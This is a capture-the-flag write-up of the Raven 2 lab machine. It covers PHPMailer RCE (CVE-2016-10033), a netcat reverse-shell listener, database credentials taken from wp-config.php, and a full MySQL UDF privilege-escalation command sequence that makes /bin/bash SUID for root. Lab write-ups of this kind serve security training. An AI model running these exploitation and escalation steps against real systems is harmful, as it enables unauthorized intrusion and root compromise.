## 1. Executive Summary
Raven 2 is a sequel to the Raven 1 machine, requiring a similar but more refined approach to exploitation. The attack involved exploiting a Remote Code Execution (RCE) vulnerability in PHPMailer (CVE-2016-10033) and escalating privileges through MySQL User Defined Functions (UDF) after performing deeper post-exploitation to locate all flags.

## 2. Reconnaissance & Enumeration

### 2.1 Service Scanning
- **Port 22/tcp:** SSH
- **Port 80/tcp:** HTTP (Apache 2.4.7)
- **Port 111/tcp:** RPCbind

### 2.2 Web Directory Discovery
Using `gobuster` and `nikto`, I identified the following:
* **/vendor/VERSION:** Confirmed PHPMailer version 5.2.18.
* **/wordpress/:** A secondary path containing a WordPress installation.
* **/contact.php:** The vulnerable entry point for PHPMailer.

---

## 3. Exploitation

### 3.1 Attack Vector: PHPMailer RCE (CVE-2016-10033)
The vulnerability allows an attacker to pass additional parameters to the `mail()` function.
1.  **Payload:** Used a Python script to send a POST request to `contact.php` that writes a malicious `.php` shell into the `/var/www/html/` directory.
2.  **Reverse Shell:** Triggered the shell via the web browser and caught the connection with `nc -lvnp 4444`.
3.  **Access:** Initial access gained as `www-data`.

### 3.2 Data Gathering
- Found database credentials in `wp-config.php`: `root:R@v3n1backdoor`.
- Located flags in `/var/www/`, `/var/www/html/wordpress/`, and `/home/`.

---

## 4. Privilege Escalation

### 4.1 MySQL UDF Root
With root database credentials, I performed a UDF injection:
1.  **Library Upload:** Identified that the system was 64-bit and uploaded the corresponding `lib_mysqludf_sys.so`.
2.  **MySQL Commands:**
    * `USE mysql;`
    * `CREATE TABLE target_table(line blob);`
    * `INSERT INTO target_table VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));`
    * `SELECT * FROM target_table INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';`
    * `CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';`
3.  **Execution:** Used `sys_exec` to give `/bin/bash` SUID permissions:
    * `SELECT sys_exec('chmod +s /bin/bash');`

**Result:** Obtained **root** privileges by executing `bash -p`. Final flag found in `/root/flag4.txt`.
